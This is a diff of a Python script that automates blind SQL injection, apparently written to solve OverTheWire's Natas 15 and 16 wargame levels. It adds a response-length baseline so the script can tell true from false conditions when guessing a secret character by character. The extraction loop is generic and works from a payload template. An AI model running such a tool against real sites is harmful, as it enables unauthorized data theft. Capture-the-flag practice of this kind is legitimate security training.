@@ -17,10 +17,10 @@ def parse_args():
     parser.add_argument("--user", required=True, help="HTTP auth username")
     parser.add_argument("--password", required=True, help="HTTP auth password")
     parser.add_argument("--param", required=True, help="Vulnerable parameter name")
-    parser.add_argument("--true-string", default="", help="String indicating TRUE condition")
-    parser.add_argument("--max-length", type=int, default=32, help="Max length of extracted value")
-    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests (seconds)")
+    parser.add_argument("--true-string", default="", help="String indicating TRUE condition (for boolean-based)")
     parser.add_argument("--payload-template", required=True, help="Payload template using {char} and/or {pos}")
+    parser.add_argument("--max-length", type=int, default=32, help="Maximum length of extracted value")
+    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests")
 
     return parser.parse_args()
 
@@ -29,7 +29,7 @@ def parse_args():
 # Core Logic
 # -------------------------------
 
-def send_payload(url, auth, param, payload, true_string):
+def send_payload(url, auth, param, payload, true_string, baseline_len):
     r = requests.get(
         url,
         params={param: payload},
@@ -37,12 +37,12 @@ def send_payload(url, auth, param, payload, true_string):
         timeout=10
     )
 
-    # Natas 15 mode (string-based)
+    # Mode 1: explicit success string (Natas 15)
     if true_string:
         return true_string in r.text
 
-    # Natas 16 mode (output-based)
-    return len(r.text.strip()) > 0
+    # Mode 2: output-length comparison (Natas 16)
+    return len(r.text) > baseline_len
 
 
 def extract_secret(args):
@@ -50,6 +50,16 @@ def extract_secret(args):
     extracted = ""
 
     print("[*] Starting blind SQL injection...\n")
+
+    # Establish baseline for output-length comparison
+    baseline_payload = args.payload_template.format(char="Z")
+    baseline_resp = requests.get(
+        args.url,
+        params={args.param: baseline_payload},
+        auth=(args.user, args.password),
+        timeout=10
+    )
+    baseline_len = len(baseline_resp.text)
 
     for pos in range(1, args.max_length + 1):
         found = False
@@ -66,6 +76,7 @@ def extract_secret(args):
                 args.param,
                 payload,
                 args.true_string,
+                baseline_len,
             ):
                 extracted += ch
                 print(f"[+] Position {pos}: {ch}  ->  {extracted}")
